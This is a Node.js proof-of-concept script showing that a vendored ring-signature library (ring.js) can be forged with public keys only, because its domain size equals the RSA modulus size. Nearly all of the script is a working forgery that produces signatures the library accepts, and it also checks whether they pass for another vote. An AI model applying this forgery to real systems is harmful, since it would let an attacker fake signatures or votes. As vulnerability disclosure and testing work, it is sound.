// Shows that the 2023 ring signature (resources/vendor/ring-signature/ring.js) can be forged
// with public keys only: its domain L (1024 bits) equals the RSA modulus size, so the extended
// trapdoor g is the identity on [n, 2^L) and closing the ring needs no inversion.
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { webcrypto } from 'node:crypto';
import { fileURLToPath } from 'node:url';

const dir = process.argv[2] || fileURLToPath(new URL('../resources/vendor/ring-signature', import.meta.url));
const ctx = vm.createContext({ window: { crypto: webcrypto }, navigator: { appName: 'Netscape', appVersion: '5.0' }, console, Math, Date, Uint32Array, Array });
for (const f of ['jsbn.js', 'jsbn2.js', 'prng4.js', 'rng.js', 'rsa.js', 'rsa2.js', 'sha1.js', 'ring.js']) {
  vm.runInContext(fs.readFileSync(path.join(dir, f), 'utf8').replace(/^export default .*$/m, ''), ctx, { filename: f });
}

const RUNS = Number(process.argv[3] || 20);
const out = vm.runInContext(`
  var wins = 0, wrongVoteAccepted = 0;
  for (var run = 0; run < ${RUNS}; run++) {
    var pubs = [];
    for (var i = 0; i < 5; i++) { var k = new RSAKey(); k.generate(1024, "10001"); pubs.push({ e: k.e, n: k.n }); }
    init(pubs);
    var message = "candidate-1";
    permut(message);

    // For each key, g is the identity on [zone, 2^L) with zone = floor((2^L - 1) / n) * n.
    // Put the free link on the key with the widest zone.
    var top = TWO.pow(L).subtract(BigInteger.ONE);
    var z = 0, zone = null, width = BigInteger.ZERO;
    for (var j = 0; j < pubs.length; j++) {
      var start = top.divide(pubs[j].n).multiply(pubs[j].n);
      var w = TWO.pow(L).subtract(start);
      if (w.compareTo(width) > 0) { width = w; zone = start; z = j; }
    }
    var u = zone.add(TWO.pow(161));   // v is a 160-bit value: v xor u stays inside the zone
    if (u.add(TWO.pow(161)).compareTo(top) >= 0) continue;

    // Same steps as sign(message, z), except the RSA inversion at z, replaced by the identity
    var s = new Array(pubs.length);
    var c = E(u.toString()), v = c;
    for (var i = (z + 1) % pubs.length; i != z; i = (i + 1) % pubs.length) {
      s[i] = rand_bigint(L - 1);
      v = E(v.xor(g(s[i], new BigInteger(pubs[i].e.toString()), pubs[i].n)).toString());
      if (i + 1 == pubs.length) c = v;
    }
    s[z] = v.xor(u);
    var forged = { sig: [c.toString()].concat(s.map(function (x) { return x.toString(); })),
                   keys: pubs.map(function (k) { return { e: k.e.toString(), n: k.n.toString() }; }) };
    if (verify(message, forged)) wins++;
    if (verify("candidate-2", forged)) wrongVoteAccepted++;
  }
  ({ runs: ${RUNS}, ringSize: 5, forgeriesAccepted: wins, acceptedForAnotherVote: wrongVoteAccepted });
`, ctx);
console.log(JSON.stringify(out));
